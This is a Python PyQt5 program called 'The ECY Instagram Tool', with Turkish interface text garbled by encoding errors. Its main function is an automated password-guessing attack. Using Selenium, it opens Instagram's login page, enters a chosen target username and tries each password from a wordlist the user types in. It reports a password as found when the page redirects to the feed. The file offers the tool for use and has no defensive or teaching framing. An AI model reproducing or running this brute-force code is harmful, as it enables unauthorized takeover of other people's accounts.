from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QTextEdit, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QTimer, Qt
import webbrowser
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

class InstagramTool(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("The ECY Instagram Tool")
        self.setGeometry(100, 200, 350, 350)
        self.setStyleSheet("background-color: red;")
        
        # "The ECY" baÅŸlÄ±ÄŸÄ± - YanÄ±p sÃ¶nen renkli
        self.title_label = QLabel("\u2620 The ECY \u2620", self)
        self.title_label.setFont(QFont("Arial", 25, QFont.Bold))
        self.title_label.setAlignment(Qt.AlignCenter)
        self.blink_timer = QTimer(self)
        self.blink_timer.timeout.connect(self.blink_title)
        self.blink_timer.start(500)
        
        # KullanÄ±cÄ± Ara KÄ±smÄ±
        self.search_label = QLabel("kullanÄ±cÄ± ara", self)
        self.search_label.setFont(QFont("Arial", 14))
        self.search_label.setStyleSheet("color: black;")
        
        self.username_input = QLineEdit(self)
        self.username_input.setPlaceholderText("Instagram kullanÄ±cÄ± adÄ± gir...")

        self.search_button = QPushButton("ARA", self)
        self.search_button.setStyleSheet("background-color: yellow; border-radius: 20px; padding: 10px; font-weight: bold;")
        self.search_button.clicked.connect(self.search_instagram)
        
        # Åifre Deneme KÄ±smÄ±
        self.password_label = QLabel("ben yaparsam olur", self)
        self.password_label.setFont(QFont("Arial", 10))
        self.password_label.setStyleSheet("color: blue;")
        
        self.password_output = QLabel("", self)
        self.password_output.setFont(QFont("Arial", 12))
        self.password_output.setStyleSheet("color: red;")
        
        self.try_passwords_button = QPushButton("BOTU BAÅLAT", self)
        self.try_passwords_button.setStyleSheet("background-color: yellow; border-radius: 20px; padding: 10px; font-weight: bold;")
        self.try_passwords_button.clicked.connect(self.try_passwords)
        
        # Wordlist Butonu
        self.wordlist_button = QPushButton("WORDLÄ°ST", self)
        self.wordlist_button.setStyleSheet("background-color: blue; border-radius: 20px; padding: 10px; font-weight: bold;")
        self.wordlist_button.clicked.connect(self.open_wordlist)
        
        # Layout
        layout = QVBoxLayout()
        layout.addWidget(self.title_label)
        layout.addWidget(self.search_label)
        layout.addWidget(self.username_input)
        layout.addWidget(self.search_button)
        layout.addWidget(self.password_label)
        layout.addWidget(self.password_output)
        layout.addWidget(self.try_passwords_button)
        layout.addWidget(self.wordlist_button)
        
        self.setLayout(layout)
    
    def blink_title(self):
        colors = ["red", "blue", "green", "orange", "purple", "yellow"]
        new_color = random.choice(colors)
        self.title_label.setStyleSheet(f"color: {new_color};")
    
    def search_instagram(self):
        username = self.username_input.text().strip()
        if username:
            webbrowser.open(f"https://www.instagram.com/{username}")
    
    def open_wordlist(self):
        self.wordlist_window = WordlistWindow()
        self.wordlist_window.show()
    
    def try_passwords(self):
        username = self.username_input.text().strip()
        if not username:
            self.password_output.setText(" kullanÄ±cÄ± adÄ± girin!")
            return
        
        try:
            driver = webdriver.Chrome()
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(3)
            
            with open("wordlist.txt", "r") as file:
                passwords = file.readlines()
            
            username_input = driver.find_element(By.NAME, "username")
            username_input.clear()
            username_input.send_keys(username)
            
            for password in passwords:
                password = password.strip()
                self.password_output.setText(f"SaldÄ±rÄ± baÅŸlÄ±yor: {password}")
                QApplication.processEvents()
                
                password_input = driver.find_element(By.NAME, "password")
                password_input.clear()
                password_input.send_keys(password)
                
                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                login_button.click()
                time.sleep(5)
                
                if "feed" in driver.current_url:
                    self.password_output.setText("âœ… Åifre Bulundu: " + password)
                    driver.quit()
                    return
            
            self.password_output.setText("âŒ Åifre bulunamadÄ±")
            driver.quit()
        except Exception as e:
            self.password_output.setText(f"Hata: {str(e)}")

class WordlistWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Wordlist")
        self.setGeometry(150, 150, 250, 250)
        self.layout = QVBoxLayout()
        
        self.wordlist_input = QTextEdit(self)
        self.wordlist_input.setPlaceholderText("Åifreleri alt alta girin...")
        self.layout.addWidget(self.wordlist_input)
        
        self.save_button = QPushButton("Kaydet", self)
        self.save_button.setStyleSheet("background-color: yellow; border-radius: 10px; font-weight: bold;")
        self.save_button.clicked.connect(self.save_passwords)
        self.layout.addWidget(self.save_button)
        
        self.setLayout(self.layout)
    
    def save_passwords(self):
        passwords = self.wordlist_input.toPlainText().strip()
        if passwords:
            with open("wordlist.txt", "a") as file:
                file.write(passwords + "\n")
            self.close()

if __name__ == "__main__":
    app = QApplication([])
    window = InstagramTool()
    window.show()
    app.exec_()
